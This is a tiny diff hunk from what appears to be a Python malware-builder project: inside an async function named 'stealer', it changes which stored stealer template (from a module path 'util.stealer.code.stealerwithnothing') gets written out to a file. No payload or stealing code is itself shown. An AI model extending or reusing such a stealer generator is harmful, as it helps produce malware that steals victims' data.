@@ -32,7 +32,7 @@ async def stealer():
 
     elif option1 and option2 == 'N':
         with open(filename, "w") as file:
-            file.write(f"{util.stealer.code.stealerwithnothing.stealer_no_err}")
+            file.write(f"{util.stealer.code.stealerwithnothing.stealer_src}")
 
     else:
         pass
